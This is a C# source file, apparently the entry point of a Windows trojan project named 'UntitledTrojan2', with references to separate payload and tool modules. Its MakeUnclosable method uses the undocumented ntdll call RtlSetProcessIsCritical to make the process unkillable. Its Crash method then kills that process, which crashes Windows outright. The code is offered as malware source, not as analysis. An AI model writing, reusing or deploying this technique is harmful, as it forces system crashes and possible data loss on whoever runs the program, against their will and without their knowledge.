using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Media;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using System.Windows.Forms;
using UntitledTrojan2.Payloads;
using UntitledTrojan2.Properties;
using UntitledTrojan2.Tools;

namespace UntitledTrojan2
{
    public static class Program
    {
        [DllImport("ntdll.dll", SetLastError = true)]
        internal static extern void RtlSetProcessIsCritical(int v1, int v2, int v3);

        [DllImport("user32.dll")]
        private static extern bool SetProcessDPIAware();

        internal static void Main(string[] args)
        {
            // Initialize
            SetProcessDPIAware();

            Application.SetHighDpiMode(HighDpiMode.SystemAware);
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.Run(new Form1());
        }

        internal static void MakeUnclosable()
        {
            // Make itself a critical process
            Process.EnterDebugMode();
            RtlSetProcessIsCritical(1, 0, 0);
        }

        internal static void Crash()
        {
            // Kill itself
            Process.GetCurrentProcess().Kill();
        }
    }
}
